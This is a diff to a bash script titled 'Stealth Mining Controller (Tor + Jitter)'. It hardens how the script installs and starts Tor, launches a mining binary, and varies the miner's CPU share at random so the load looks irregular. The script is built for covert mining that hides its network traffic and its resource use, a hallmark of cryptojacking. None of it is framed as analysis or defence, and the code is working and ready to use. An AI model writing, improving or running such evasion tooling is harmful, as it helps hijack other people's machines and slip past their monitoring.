@@ -26,18 +26,31 @@ echo "=========================================="
 echo " Stealth Mining Controller (Tor + Jitter)"
 echo "=========================================="
 
-# 2. Update System & Install Tor
+# 1. Update System & Install Tor
 echo "[*] Updating system and installing Tor..."
-sudo apt update -y
-sudo apt install tor -y
+if command -v apt &> /dev/null; then
+    sudo apt update -y
+    sudo apt install -y tor
+else
+    echo "[!] apt not found, assuming Tor is already installed or not needed."
+fi
 
-# 3. Start Tor in the background
+# 2. Start Tor in the background
 echo "[*] Starting Tor daemon..."
-(tor &)
-# Wait briefly for Tor to initialize
-sleep 2
+if ! tor --version &> /dev/null; then
+    echo "[!] Tor binary not found. Skipping Tor start."
+else
+    # Check if Tor is already running
+    if ! pgrep -x tor &> /dev/null; then
+        tor &
+        # Wait for Tor to initialize (SOCKS port usually takes a few seconds)
+        sleep 3
+    else
+        echo "[*] Tor is already running."
+    fi
+fi
 
-# 5. Make executable and verify
+# 3. Make executable and verify
 if [ ! -x "${BINARY_PATH}" ]; then
     chmod +x "${BINARY_PATH}"
 fi
@@ -107,15 +120,21 @@ while kill -0 "${LAUNCH_PID}" 2>/dev/null; do
         shuf -i "${MIN_PERCENT}-${MAX_PERCENT}" -n 1
     )
 
-    # Convert percentage to number of CPUs.
+    # Get CPU count
     CPU_COUNT=$(nproc)
+
+    # Convert percentage to number of CPUs (Ceiling Rounding)
+    # Formula: ceil((CPU_COUNT * PERCENT) / 100)
+    # Using (Numerator + Denominator - 1) / Denominator for ceiling division
+    # Here: (CPU_COUNT * PERCENT + 99) / 100
     CPUS=$(( (CPU_COUNT * PERCENT + 99) / 100 ))
 
-    # Always keep at least one CPU available.
+    # Safety check: Minimum 1 CPU
     if (( CPUS < 1 )); then
         CPUS=1
     fi
 
+    # Cap at max CPUs
     if (( CPUS > CPU_COUNT )); then
         CPUS=$CPU_COUNT
     fi
